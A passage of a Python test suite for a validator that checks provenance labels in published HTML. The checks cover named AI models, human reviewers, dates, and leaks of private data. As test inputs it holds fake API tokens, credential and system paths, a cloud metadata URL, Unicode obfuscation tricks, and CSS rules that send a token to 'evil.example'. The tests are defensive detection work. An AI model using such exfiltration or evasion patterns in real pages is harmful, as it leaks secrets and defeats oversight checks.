                self.assertEqual(len(self.run_contract(body)), 1)
        encoded_model = AUDIT_RAIL.replace("GPT-5", "%55NKNOWN")
        self.assertEqual(len(self.run_contract(encoded_model)), 1)

        for obfuscated_identity in (
            "some\u200bone",
            "anon\u200bymous",
            "un\u200bassigned",
            "pend\u200bing review",
            "Cod\u200bex reviewer",
            "Deep\u200bSeek reviewer",
        ):
            with self.subTest(obfuscated_identity=obfuscated_identity):
                body = AUDIT_RAIL.replace("Mina Patel", obfuscated_identity)
                self.assertEqual(len(self.run_contract(body)), 1)

        obfuscated_author = AUDIT_RAIL.replace("Dennis Yu", "Cod\ufe0fex")
        self.assertEqual(len(self.run_contract(obfuscated_author)), 1)
        for old, obfuscated in (
            ("Mina Patel", "Mina\u200b Patel"),
            ("agent:codex-fleet-audit", "agent:cod\u200bex-root-audit"),
            ("GPT-5", "GPT-\u200b5"),
        ):
            with self.subTest(obfuscated=obfuscated):
                self.assertEqual(
                    len(self.run_contract(AUDIT_RAIL.replace(old, obfuscated))), 1
                )
        obfuscated_model = AUDIT_RAIL.replace("GPT-5", "pend\u200bing")
        self.assertEqual(len(self.run_contract(obfuscated_model)), 1)
        obfuscated_unknown_model = AUDIT_RAIL.replace("GPT-5", "UNKN\u200bOWN")
        self.assertEqual(len(self.run_contract(obfuscated_unknown_model)), 1)

        for generic_model in (
            "model",
            "AI",
            "assistant",
            "bot",
            "LLM",
            "language model",
            "runtime model",
            "some model",
            "GPT",
            "Claude",
            "Codex",
            "ChatGPT",
            "Gemini",
            "Qwen",
            "DeepSeek",
            "OpenAI",
            "Anthropic",
            "AI model",
            "LLM model",
            "production model",
            "current model",
            "latest model",
            "runtime",
            "default",
            "unspecified model",
            "model v1",
            "GPT model",
            "Claude model",
            "OpenAI model",
            "vendor model",
            "chatbot",
            "banana",
            "Alice Smith",
            "runtime banana",
            "vendor banana",
            "other",
            "proprietary",
            "frontier",
            "chat",
            "text generator",
            "Reviewer Alice",
            "GPT banana",
            "Claude banana",
        ):
            with self.subTest(generic_model=generic_model):
                body = AUDIT_RAIL.replace("GPT-5", generic_model)
                self.assertEqual(len(self.run_contract(body)), 1)

        for concrete_model in sorted(PUBLIC_MODEL_IDS):
            with self.subTest(concrete_model=concrete_model):
                body = AUDIT_RAIL.replace("GPT-5", concrete_model)
                self.assertEqual(self.run_contract(body), [])

        for human_name in (
            "Claude Hopkins",
            "Claude Shannon",
            "Gemini Jones",
            "Qwen Li",
            "José García",
            "李 小龙",
            "Иван Иванов",
            "محمد علي",
            "山田 太郎",
            "김 민수",
            "李小龙",
            "山田太郎",
            "김민수",
            "Δημήτρης Παπαδόπουλος",
            "Łukasz Żółć",
            "M. Patel",
            "J. R. Smith",
        ):
            with self.subTest(human_name=human_name):
                body = AUDIT_RAIL.replace("Mina Patel", human_name)
                self.assertEqual(self.run_contract(body), [])

        for role_plus_name in (
            "Reviewer Alice",
            "QA Alice",
            "Human Jane",
            "Reviewed by Alice",
            "Mina Reviewer",
            "Compliance Bob",
            "Audit Alice",
            "External Alice",
            "Independent Alice",
            "Dr Smith",
            "Ms Patel",
        ):
            with self.subTest(role_plus_name=role_plus_name):
                body = AUDIT_RAIL.replace("Mina Patel", role_plus_name)
                self.assertEqual(len(self.run_contract(body)), 1)

        for invalid_agent_id in ("agent:a", "agent:ai", "job:x"):
            with self.subTest(invalid_agent_id=invalid_agent_id):
                body = AUDIT_RAIL.replace(
                    "agent:codex-fleet-audit", invalid_agent_id
                )
                self.assertEqual(len(self.run_contract(body)), 1)

        for generic_actor in (
            "agent:bot", "agent:agent", "agent:job", "agent:human",
            "agent:reviewer", "agent:model", "agent:gpt", "agent:current",
            "agent:latest", "agent:production", "job:bot", "job:job",
            "job:agent", "job:cron", "job:audit",
        ):
            with self.subTest(generic_actor=generic_actor):
                body = AUDIT_RAIL.replace("agent:codex-fleet-audit", generic_actor)
                self.assertEqual(len(self.run_contract(body)), 1)

        for generic_agent in (
            "AI Assistant",
            "Chatbot",
            "Language Model",
            "LLM",
            "Automation Runtime",
            "Current Agent",
            "Production Bot",
            "Agent 1",
            "Documentation AI",
            "OpenAI",
            "Anthropic",
            "Software Agent",
            "Virtual Agent",
            "Agentic AI",
            "Codex",
        ):
            with self.subTest(generic_agent=generic_agent):
                body = AUDIT_RAIL.replace("agent:codex-fleet-audit", generic_agent)
                self.assertEqual(len(self.run_contract(body)), 1)

        for field, real_value in (
            ("data-human-author", "Dennis Yu"),
            ("data-human-reviewer", "Mina Patel"),
            ("data-maintainer-agent", "agent:codex-fleet-audit"),
        ):
            for generic_role in (
                "staff",
                "the team",
                "manager",
                "owner",
                "QA team",
                "review staff",
                "auditor",
                "operator",
                "admin",
                "some agent",
                "Human Review Team",
                "Security Team",
                "Operations Team",
                "Compliance Team",
                "Editorial Board",
                "Review Committee",
                "QA Department",
                "Verification Department",
                "Documentation Department",
                "Content Function",
                "Review Desk",
                "Quality Assurance",
                "Human reviewer on duty",
                "The reviewer on duty",
                "Staff Reviewer",
                "Review Lead",
                "QA Lead",
            ):
                with self.subTest(field=field, generic_role=generic_role):
                    body = AUDIT_RAIL.replace(
                        f'{field}="{real_value}"', f'{field}="{generic_role}"'
                    ).replace(real_value, generic_role)
                    self.assertEqual(len(self.run_contract(body)), 1)

        for bidi_identity in ("Mina\u202e Patel", "Alice\u2066 Bob"):
            with self.subTest(bidi_identity=bidi_identity):
                body = AUDIT_RAIL.replace("Mina Patel", bidi_identity)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("bidirectional", found[0].detail)

    def test_visible_values_are_bound_to_their_own_labels(self):
        swaps = (
            AUDIT_RAIL.replace("Human author: Dennis Yu", "Human author: Mina Patel")
            .replace("Human reviewer: Mina Patel", "Human reviewer: Dennis Yu"),
            AUDIT_RAIL.replace("Agent: agent:codex-fleet-audit", "Agent: GPT-5")
            .replace("Model: GPT-5", "Model: agent:codex-fleet-audit"),
            AUDIT_RAIL.replace(
                "Maintainer: Documentation function",
                "Maintainer: wp:110278:113449",
            ).replace(
                "Source revision: wp:110278:113449",
                "Source revision: Documentation function",
            ),
            AUDIT_RAIL.replace(
                "Verification scope: external-exact-live-bytes",
                "Verification scope: capture-100",
            ).replace(
                "Capture run: capture-100",
                "Capture run: external-exact-live-bytes",
            ),
        )
        for body in swaps:
            with self.subTest(body=body[:200]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("visible rail label", found[0].detail)

        crossed_without_punctuation = AUDIT_RAIL.replace(
            "Human author: Dennis Yu. Maintainer: Documentation function. "
            "Agent: agent:codex-fleet-audit. Model: GPT-5. "
            "Human reviewer: Mina Patel.",
            "Human author: Mina Patel Human reviewer: Dennis Yu Mina Patel. "
            "Maintainer: Documentation function. Agent: agent:codex-fleet-audit. "
            "Model: GPT-5.",
        )
        found = self.run_contract(crossed_without_punctuation)
        self.assertEqual(len(found), 1)
        self.assertIn("visible rail label", found[0].detail)

        contradictions = (
            AUDIT_RAIL.replace("State: receipt-linked.", "State: not receipt-linked."),
            AUDIT_RAIL.replace(
                "Scheduler capture result: success.",
                "Scheduler capture result: success? No, failure.",
            ),
            AUDIT_RAIL.replace(
                "Publication verification result: success.",
                "Publication verification result: success is false.",
            ),
            AUDIT_RAIL.replace(
                "Human reviewer: Mina Patel.",
                "Human reviewer: Mina Patel did not review.",
            ),
            AUDIT_RAIL.replace(
                "Model: GPT-5.", "Model: GPT-5 is not the runtime model."
            ),
        )
        for contradictory in contradictions:
            with self.subTest(contradictory=contradictory[:220]):
                self.assertEqual(len(self.run_contract(contradictory)), 1)

    def test_placeholder_model_and_invalid_result_or_scope_fail(self):
        cases = (
            AUDIT_RAIL.replace('data-maintainer-model="GPT-5"',
                               'data-maintainer-model="pending"'),
            AUDIT_RAIL.replace('data-scheduler-capture-result="success"',
                               'data-scheduler-capture-result="maybe"'),
            AUDIT_RAIL.replace('data-publication-verification-result="success"',
                               'data-publication-verification-result="pending"'),
            AUDIT_RAIL.replace('data-capture-run-id="capture-100"',
                               'data-capture-run-id="invalid-public-run-id"'),
            AUDIT_RAIL.replace('data-verification-scope="external-exact-live-bytes"',
                               'data-verification-scope="self-certified"'),
        )
        for body in cases:
            with self.subTest(body=body[:160]):
                self.assertEqual(len(self.run_contract(body)), 1)

    def test_required_values_must_be_visible_in_the_rail(self):
        visible_phrases = (
            "Verification scope: external-exact-live-bytes",
            "Human author: Dennis Yu",
            "Maintainer: Documentation function",
            "Agent: agent:codex-fleet-audit",
            "Model: GPT-5",
            "Human reviewer: Mina Patel",
            "Capture run: capture-100",
            "Scheduler capture result: success",
            "Publication verification result: success",
            "Publication receipt ID: receipt-100",
            "https://example.test/receipts/receipt-100.json",
            "Source revision: wp:110278:113449",
            "State: receipt-linked",
        )
        for visible_phrase in visible_phrases:
            with self.subTest(value=visible_phrase):
                body = AUDIT_RAIL.replace(visible_phrase, "redacted")
                self.assertEqual(len(self.run_contract(body)), 1)

    def test_time_labels_must_name_the_clock_and_visible_date(self):
        opaque = AUDIT_RAIL.replace(
            "Changed August 25, 2026", "x"
        ).replace("Checked August 31, 2026", "y")
        found = self.run_contract(opaque)
        self.assertEqual(len(found), 1)
        self.assertIn("must visibly name", found[0].detail)

        for contradictory in (
            AUDIT_RAIL.replace("Checked August 31, 2026", "Unchecked August 31, 2026"),
            AUDIT_RAIL.replace("Checked August 31, 2026", "Not checked August 31, 2026"),
            AUDIT_RAIL.replace("Checked August 31, 2026", "Never checked August 31, 2026"),
            AUDIT_RAIL.replace("Changed August 25, 2026", "Unchanged August 25, 2026"),
            AUDIT_RAIL.replace("Changed August 25, 2026", "Not changed August 25, 2026"),
            AUDIT_RAIL.replace(
                "Changed August 25, 2026", "Changed? No. August 25, 2026"
            ),
        ):
            with self.subTest(contradictory=contradictory[-180:]):
                found = self.run_contract(contradictory)
                self.assertEqual(len(found), 1)
                self.assertIn("must visibly name", found[0].detail)

    def test_visible_clock_dates_allow_unambiguous_month_first_or_day_first(self):
        for changed_label, checked_label in (
            ("Changed August 25 2026", "Checked August 31 2026"),
            ("Changed 25 August 2026", "Checked 31 August 2026"),
            ("Changed 25 Aug 2026", "Checked 31 Aug 2026"),
        ):
            with self.subTest(changed=changed_label, checked=checked_label):
                body = AUDIT_RAIL.replace(
                    "Changed August 25, 2026", changed_label
                ).replace("Checked August 31, 2026", checked_label)
                self.assertEqual(self.run_contract(body), [])

    def test_visible_semantic_times_are_exactly_the_two_contract_clocks(self):
        additions = (
            '<time datetime="2026-07-22T00:00:00Z">Last updated July 22, 2026</time>',
            '<time datetime="invalid">Changed July 22, 2026</time>',
            '<time>Changed July 22, 2026</time>',
            '<time datetime="2026-08-31T20:00:00-05:00">Changed July 22, 2026</time>',
        )
        for addition in additions:
            with self.subTest(addition=addition):
                body = AUDIT_RAIL.replace("</aside>", addition + "</aside>")
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("<time>", found[0].detail)

    def test_time_clock_label_may_be_immediately_adjacent(self):
        adjacent = AUDIT_RAIL.replace(
            '<time datetime="2026-08-25T23:06:50-07:00">Changed August 25, 2026',
            'Changed <time datetime="2026-08-25T23:06:50-07:00">August 25, 2026',
        ).replace(
            '<time datetime="2026-08-31T20:00:00-05:00">Checked August 31, 2026',
            'Checked <time datetime="2026-08-31T20:00:00-05:00">August 31, 2026',
        )
        self.assertEqual(self.run_contract(adjacent), [])

    def test_time_clock_label_may_immediately_follow_the_time(self):
        trailing = AUDIT_RAIL.replace(
            '<time datetime="2026-08-25T23:06:50-07:00">Changed August 25, 2026</time>',
            '<time datetime="2026-08-25T23:06:50-07:00">August 25, 2026</time> Changed',
        ).replace(
            '<time datetime="2026-08-31T20:00:00-05:00">Checked August 31, 2026</time>',
            '<time datetime="2026-08-31T20:00:00-05:00">August 31, 2026</time> Checked',
        )
        self.assertEqual(self.run_contract(trailing), [])

    def test_adjacent_clock_label_skips_formatting_whitespace(self):
        formatted = AUDIT_RAIL.replace(
            '<time datetime="2026-08-31T20:00:00-05:00">Checked August 31, 2026',
            '<span>Checked</span>\n  '
            '<time datetime="2026-08-31T20:00:00-05:00">August 31, 2026',
        )
        self.assertEqual(self.run_contract(formatted), [])

    def test_clock_label_cannot_jump_over_an_intervening_dom_subtree(self):
        original = (
            '<time datetime="2026-08-25T23:06:50-07:00">'
            "Changed August 25, 2026</time>"
        )
        replacements = (
            '<p>Changed August 25, 2026</p><div><span></span></div>'
            '<time datetime="2026-08-25T23:06:50-07:00">August 25, 2026</time>',
            '<time datetime="2026-08-25T23:06:50-07:00">August 25, 2026</time>'
            '<div><span></span></div><p>Changed</p>',
        )
        for replacement in replacements:
            with self.subTest(replacement=replacement):
                found = self.run_contract(AUDIT_RAIL.replace(original, replacement))
                self.assertEqual(len(found), 1)
                self.assertIn("must visibly name", found[0].detail)

    def test_duplicate_attributes_anywhere_in_the_rail_subtree_fail(self):
        cases = (
            AUDIT_RAIL.replace(
                "<p>", '<p style="display:none" style="display:block">', 1
            ),
            AUDIT_RAIL.replace(
                '<a href="https://example.test/sources/fleet.json">',
                '<a href="https://evil.example/source" '
                'href="https://example.test/sources/fleet.json">',
                1,
            ),
            AUDIT_RAIL.replace(
                '<a href="https://example.test/sources/fleet.json">',
                '<a style="display:none" style="display:block" '
                'href="https://example.test/sources/fleet.json">',
                1,
            ),
            AUDIT_RAIL.replace(
                '<time datetime="2026-08-31T20:00:00-05:00">',
                '<time style="display:none" style="display:block" '
                'datetime="2026-08-31T20:00:00-05:00">',
                1,
            ),
        )
        for body in cases:
            with self.subTest(body=body[-220:]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertIn("repeats attribute", found[0].detail)

    def test_public_provenance_values_reject_private_hosts_and_secrets(self):
        nested_path = "/tmp/client-secret.json"
        for _ in range(fleet_check.MAX_PUBLIC_DECODE_ROUNDS + 1):
            nested_path = quote(nested_path, safe="")
        cases = (
            AUDIT_RAIL.replace(
                "https://example.test/sources/fleet.json",
                "https://localhost/private/source.json",
            ),
            AUDIT_RAIL.replace(
                "https://example.test/receipts", "https://10.0.0.1/receipts"
            ),
            AUDIT_RAIL.replace(
                "https://example.test/sources/fleet.json",
                "https://example.test/source?api_key=supersecretvalue",
            ),
            AUDIT_RAIL.replace(
                'data-source-revision="wp:110278:113449"',
                'data-source-revision="file://Users/alice/private.json"',
            ),
            AUDIT_RAIL.replace(
                'data-source-revision="wp:110278:113449"',
                'data-source-revision="C:/Users/alice/private.json"',
            ),
            AUDIT_RAIL.replace(
                'data-capture-run-id="capture-100"',
                'data-capture-run-id="ghp_12345678901234567890"',
            ),
            AUDIT_RAIL.replace(
                'data-maintainer-model="GPT-5"',
                'data-maintainer-model="sk_live_1234567890"',
            ),
            AUDIT_RAIL.replace(
                'data-human-author="Dennis Yu"',
                'data-human-author="alice@corp.com"',
            ),
            AUDIT_RAIL.replace(
                'data-human-author="Dennis Yu"',
                'data-human-author="/Users/alice/private.json"',
            ),
            AUDIT_RAIL.replace("Dennis Yu", nested_path),
            AUDIT_RAIL.replace("Dennis Yu", "Dennis\x00Yu"),
            AUDIT_RAIL.replace(
                "Documentation function", "Fleet\x00documentation\x00function"
            ),
            AUDIT_RAIL.replace("Mina Patel", "Mina\x00Patel"),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "path:/tmp/client-alpha/schedules.json"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "[/private/var/folders/secret/cache.json]"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "at:/Users/dennis/project/file.json"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "x,/home/user/secrets.txt"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", r"\\server\client-alpha\schedules.json"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "/usr/local/client-alpha/secrets.json"
            ),
            AUDIT_RAIL.replace(
                "wp:110278:113449", "/workspace/client-alpha/private.json"
            ),
            AUDIT_RAIL.replace("wp:110278:113449", "/tmp"),
            AUDIT_RAIL.replace("wp:110278:113449", "/Users"),
            AUDIT_RAIL.replace("wp:110278:113449", "/private"),
            AUDIT_RAIL.replace("wp:110278:113449", "/workspace"),
            AUDIT_RAIL.replace("wp:110278:113449", "~/"),
            AUDIT_RAIL.replace("wp:110278:113449", "C:\\"),
            AUDIT_RAIL.replace("wp:110278:113449", r"\\server"),
            AUDIT_RAIL.replace(
                "capture-100",
                "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghi1234567890",
            ),
            AUDIT_RAIL.replace(
                "capture-100", "AIzaabcdefghijklmnopqrstuvwxyz123456789"
            ),
            AUDIT_RAIL.replace(
                "capture-100",
                "SG.abcdefghijklmno.abcdefghijklmnopqrstuvwxyz123456",
            ),
        )
        for body in cases:
            with self.subTest(body=body[:240]):
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    any(
                        label in found[0].detail
                        for label in (
                            "private",
                            "non-public",
                            "email",
                            "credential",
                            "token",
                            "control",
                            "nested",
                        )
                    ),
                    found[0].detail,
                )
        self.assertIsNone(
            fleet_check._public_value_problem("https://public.example/safe/path")
        )
        for private_path in (
            "run-../../secret", "cache-../private", "../", "./private/client",
            "Users/alice/private.json", "Library/Application Support/secret.json",
            "/boot/grub/config", "/media/alice/drive", "/nix/store/private",
            "/Network/Servers/private", "/snap/private", "/storage/emulated/0/private",
            "/sdcard/private", "/.ssh/id_ed25519",
            "./etc/passwd", "./bin/tool", "./dev/null", "./proc/self",
            "./run/secrets", "./mnt/data", "./nix/store/x", "./Volumes/Data",
            "./System/Library", "/data/data/app/private", "/data/user/0/private",
            "%USERPROFILE%\\private", "%APPDATA%\\private", "$HOME/private",
            "$USERPROFILE/private", "$TMPDIR/private",
        ):
            with self.subTest(private_path=private_path):
                self.assertIn(
                    "path", fleet_check._public_value_problem(private_path)
                )
        for secret in (
            "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghi1234567890",
            "AIzaabcdefghijklmnopqrstuvwxyz123456789",
            "SG.abcdefghijklmno.abcdefghijklmnopqrstuvwxyz123456",
            "github_pat_11AAabcdefghijklmnopqrstuvwxyz123456",
            "glpat-abcdefghijklmnopqrstuvwx",
            "sk_proj_abcdefghijklmnopqrstuvwx",
            "rk_live_abcdefghijklmnopqrstuvwx",
            "ASIAABCDEFGHIJKLMNOP",
            "-----BEGIN PRIVATE KEY-----",
            "npm_abcdefghijklmnopqrstuvwxyz123456",
            "ya29.abcdefghijklmnopqrstuvwxyz123456",
            "pypi-abcdefghijklmnopqrstuvwxyz",
            "dop_v1_abcdefghijklmnopqrstuvwxyz",
            "hf_abcdefghijklmnopqrstuvwxyz",
            "SK0123456789abcdef0123456789abcdef",
            "Basic dXNlcjpwYXNzd29yZA==",
            "whsec_abcdefghijklmnopqrstuvwxyz123456",
            "glrt-abcdefghijklmnopqrstuvwxyz123456",
            "abcdefghijklmnopqrst.abcdef.uvwxyzabcdefghijklmn",
            "Basic-dXNlcjpwYXNzd29yZA==",
            "shpat_abcdefghijklmnopqrstuvwxyz123456",
            "shpca_abcdefghijklmnopqrstuvwxyz123456",
            "accountKey=YWJjZGVmZ2hpamtsbW5vcA==",
            "Account-Key: YWJjZGVmZ2hpamtsbW5vcA==",
            "Authorization abcdefghijklmnop",
            "password letmein",
        ):
            with self.subTest(encoded_secret=secret):
                self.assertIn(
                    "credential/token",
                    fleet_check._public_value_problem(quote(secret, safe="")),
                )

        for separator in ("\u2044", "\u2215", "\u2236", "\u02d0", "\u2027", "\u30fb", "\ua789"):
            with self.subTest(confusable_separator=separator):
                unsafe = f"client{separator}id{separator}account-1234"
                self.assertIn(
                    "sensitive private-data label",
                    fleet_check._public_value_problem(quote(unsafe, safe="")),
                )

        for safe_public_prose in (
            "secret sauce recipe",
            "API key rotation guide",
            "https://example.com/api-key-rotation",
            "https://example.com/secret-sauce",
            "https://blitzmetrics.com/task-library-dashboard/",
        ):
            with self.subTest(safe_public_prose=safe_public_prose):
                self.assertIsNone(
                    fleet_check._public_value_problem(safe_public_prose)
                )

    def test_whole_document_privacy_reassembles_split_and_escaped_values(self):
        payloads = (
            '<div data-x="api key" data-y=": abc123"></div>',
            '<div data-api="key" data-value="abc123"></div>',
            '<div title="api" aria-label="key: abc123"></div>',
            '<div title="api key:">abc123</div>',
            '<script>const a="api"</script><script>const b="key: abc123"</script>',
            '<style>.a{--x:"api"}.b{--y:"key: abc123"}</style>',
            '<script>window.x={"api\\u005fkey":"abc123def456"}</script>',
            '<script>const x="sk\\u005ftest\\u005fabcdefghijklmnop"</script>',
            '<script>const x="/\\u0055sers/alice/private.json"</script>',
            '<script>const x="alice\\u0040example.com"</script>',
            '<meta content="https://example.com/?path=/Users/alice/private.json">',
            '<meta content="https://example.com/?next=file%3A%2F%2F%2Ftmp%2Fsecret">',
            '<api-key>abc123def456</api-key>',
            '<x-api-key>abc123def456</x-api-key>',
            '<ghp_abcdefghijklmnopqrstuvwxyz></ghp_abcdefghijklmnopqrstuvwxyz>',
            '<sk-test-abcdefghijklmnop></sk-test-abcdefghijklmnop>',
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                self.assertEqual(len(self.run_contract(payload + AUDIT_RAIL)), 1)

    def test_script_escape_privacy_is_bounded_and_unicode_scalar_aware(self):
        nested = r"\u002fUsers/alice/private.json"
        for _ in range(fleet_check.MAX_PUBLIC_DECODE_ROUNDS):
            nested = nested.replace("\\", r"\u005c")
        blocked = (
            f'<script>const x="{nested}"</script>',
            '<script>const x="\\uD83D"</script>',
            '<script>const x="\\057Users/alice/private.json"</script>',
            '<script>const x="alice\\100example.com"</script>',
        )
        for payload in blocked:
            with self.subTest(payload=payload[:120]):
                self.assertEqual(len(self.run_contract(payload + AUDIT_RAIL)), 1)

        for escaped_emoji in (r"\uD83D\uDE00", r"\ud83d\ude80"):
            with self.subTest(escaped_emoji=escaped_emoji):
                payload = f'<script>const x="{escaped_emoji}"</script>'
                self.assertEqual(self.run_contract(payload + AUDIT_RAIL), [])

    def test_extra_rail_attributes_cannot_smuggle_private_provenance(self):
        additions = (
            'data-private-job-id="client-alpha-123"',
            'data-machine-path="/tmp/client-alpha/schedules.json"',
            'data-api-key="sk-test_abcdefghijklmnop"',
            'data-private-prompt="Customer Alice secret prompt"',
            'data-note="path:/tmp/client-alpha/schedules.json"',
            'data-schedule="customer-alpha nightly at 3am"',
            'data-scheduler-id="customer-alpha-987"',
            'data-private-artifact-url="https://secrets.internal.corp/client-alpha.json"',
            'data-ledger-commit="abcdef123456"',
            'data-ledger-path="receipts/private/client-alpha.json"',
            'data-source-record="customer alpha credentials"',
            'data-public-url="https://secrets.internal.corp/client-alpha.json"',
            'title="See /tmp/client-alpha/private.json"',
            'aria-label="Bearer abcdefghijklmnopqrst"',
            'style="--api-key:sk-test_abcdefghijklmnop"',
            'style="background:url(https://secrets.internal.corp/client-alpha.png)"',
            'class="sk-test_abcdefghijklmnop"',
            'data-cron="0 0 * * *"',
            'data-cadence="nightly"',
            'data-fire-at="03:00"',
            'data-timezone="America/Chicago"',
            'data-next-run="tomorrow"',
            'data-last-run="today"',
            'data-task-id="client-alpha"',
            'data-automation-id="client-alpha"',
            'data-client-name="Alice"',
            'data-customer="Sigrun"',
            'data-ｐｒｉｖａｔｅ-ｐｒｏｍｐｔ="do the confidential thing"',
            'data-ｃｌｉｅｎｔ="AcmeCo"',
            'data-ｓｃｈｅｄｕｌｅ="weekday mornings"',
            'data-ｔｏｋｅｎ="ordinarylookingsecret"',
        )
        for addition in additions:
            with self.subTest(attribute=addition):
                body = AUDIT_RAIL.replace("<aside ", f"<aside {addition} ", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                if addition.startswith("data-"):
                    self.assertIn("unapproved root data attribute", found[0].detail)
                self.assertTrue(
                    "forbidden private" in found[0].detail
                    or "private machine path" in found[0].detail
                    or "private/local hostname" in found[0].detail
                    or "credential" in found[0].detail
                    or "token" in found[0].detail
                    or "sensitive private-data label" in found[0].detail,
                    found[0].detail,
                )

    def test_descendant_attributes_and_all_public_rail_bytes_are_privacy_scanned(self):
        descendants = (
            '<p data-secret="raw-client-secret" data-cron="0 0 * * *" '
            'data-task-id="client-alpha" title="/tmp/client.json">',
            '<p data-debug="ghp_12345678901234567890">',
        )
        for opening in descendants:
            with self.subTest(opening=opening):
                body = AUDIT_RAIL.replace("<p>", opening, 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "descendant" in found[0].detail
                    or "private" in found[0].detail
                    or "token" in found[0].detail,
                    found[0].detail,
                )

        raw_public_urls = (
            "http://localhost/client-alpha",
            "http://127.0.0.1/private",
            "https://10.0.0.1/client",
            "https://internal.corp/secret",
            "https://server/share",
            "smb://fileserver/client-alpha",
            "//fileserver/client-alpha",
        )
        for public_url in raw_public_urls:
            with self.subTest(public_url=public_url):
                body = AUDIT_RAIL.replace("<p>", public_url + " <p>", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "URL" in found[0].detail
                    or "private" in found[0].detail
                    or "non-public" in found[0].detail,
                    found[0].detail,
                )

        sensitive_labels = (
            "Cron: 0 0 * * *",
            "Schedule: every 5 minutes",
            "Private prompt: email the client",
            "Job ID: client-alpha-daily",
            "Task ID: client-alpha",
            "Client: Acme Roofing",
            "Customer: Example Dental",
            "Registry path: internal/registry.json",
            "API key: abcdefghijklmnop",
            "private_prompt: hidden",
            "client-id: abc",
            "customer_id: abc",
            "job-id: abc",
            "task_id: abc",
            "registry-path: private/registry.json",
            "api_key: abcdefghijklmnop",
            "access_token: abcdefghijklmnop",
            "auth-token: abcdefghijklmnop",
            "session_token: abcdefghijklmnop",
            "client_secret: abcdefghijklmnop",
            "private-job: abc",
            "machine_path: /tmp/private.json",
            "client‐id: abc",
            "api—key: abcdefghijklmnop",
            "client−id: abc",
            "clientid: abc",
            "registrypath: private/registry.json",
            "api\u200bkey: abcdefghijklmnop",
        )
        for private_label in sensitive_labels:
            with self.subTest(private_label=private_label):
                body = AUDIT_RAIL.replace("<p>", private_label + " <p>", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "sensitive private-data label" in found[0].detail
                    or "private machine path" in found[0].detail
                    or "control characters" in found[0].detail,
                    found[0].detail,
                )

    def test_every_hidden_provenance_candidate_is_privacy_scanned(self):
        hidden_candidates = (
            '<aside hidden data-document-provenance="receipt-linked" '
            'data-secret="ghp_abcdefghijklmnopqrstuvwxyz">/tmp/client.json</aside>',
            '<aside aria-hidden="true" data-document-provenance="receipt-linked" '
            'data-secret="ghp_abcdefghijklmnopqrstuvwxyz">alice@example.com</aside>',
            '<style>.secret-rail{display:none}</style><aside class="secret-rail" '
            'data-document-provenance="receipt-linked" data-secret="ghp_abcdefghijklmnopqrstuvwxyz">'
            '/tmp/client.json</aside>',
            '<details><aside data-document-provenance="receipt-linked" '
            'data-secret="ghp_abcdefghijklmnopqrstuvwxyz">alice@example.com</aside></details>',
        )
        for hidden_candidate in hidden_candidates:
            with self.subTest(hidden_candidate=hidden_candidate[:80]):
                found = self.run_contract(AUDIT_RAIL + hidden_candidate)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    "private" in found[0].detail
                    or "token" in found[0].detail
                    or "email" in found[0].detail,
                    found[0].detail,
                )

        nested = "&#47;tmp/client.json"
        encoded_values = []
        for _ in range(fleet_check.MAX_PUBLIC_DECODE_ROUNDS):
            nested = nested.replace("&", "&amp;")
            encoded_values.append(nested)
        self.assertIn(
            "private machine path",
            fleet_check._public_value_problem(encoded_values[-2]),
        )
        self.assertIn(
            "excessively nested",
            fleet_check._public_value_problem(encoded_values[-1]),
        )
        body = AUDIT_RAIL.replace(
            "</aside>", f"<!-- {encoded_values[-1]} --></aside>"
        )
        self.assertEqual(len(self.run_contract(body)), 1)

        public_byte_payloads = (
            "<!-- /tmp/client/secret.json ghp_12345678901234567890 -->",
            "<!-- &#47;tmp&#47;client.json -->",
            "<!-- alice&#64;example.com -->",
            "<script>const token='ghp_12345678901234567890'</script>",
            "<script>&#47;tmp&#47;client.json</script>",
            '<template><span data-secret="raw">alice@example.com</span></template>',
            "<style>/* alice@example.com /tmp/client.json */</style>",
            "<style>/* &#47;tmp&#47;client.json */</style>",
            "<?debug /tmp/client.json?>",
            "<?debug alice@example.com?>",
            '<!DOCTYPE x SYSTEM "/tmp/client.json">',
            "/tmp/client/secret.json ",
            "alice@example.com ",
            "ghp_12345678901234567890 ",
        )
        for payload in public_byte_payloads:
            with self.subTest(payload=payload):
                body = AUDIT_RAIL.replace("<p>", payload + "<p>", 1)
                found = self.run_contract(body)
                self.assertEqual(len(found), 1)
                self.assertTrue(
                    any(
                        label in found[0].detail
                        for label in (
                            "private",
                            "email",
                            "token",
                            "credential",
                            "descendant",
                        )
                    ),
                    found[0].detail,
                )

    def test_applicable_css_cannot_generate_private_text_or_secret_fetches(self):
        body = AUDIT_RAIL.replace("<aside ", '<aside class="bm" ', 1)
        body = body.replace("<p>", "<p><span>Public descendant</span>", 1)
        rules = (
            '.bm::before{content:"private prompt: secret"}',
            '.bm::after{content:"client data: secret"}',
            '.bm{background-image:url(https://evil.example/?token=secret)}',
            '.bm span::before{content:"private prompt: secret"}',
            '.bm span{background-image:url(https://evil.example/?token=secret)}',
            r'.bm::before{content:"private\20 prompt\3a secret"}',
            '.bm{background-image:url(http://127.0.0.1/private)}',
            '.bm{background-image:url(https://localhost/private)}',
            '.bm{background-image:url(https://169.254.169.254/latest/meta-data)}',
            '.bm{background-image:url(ftp://internal.corp/secret)}',
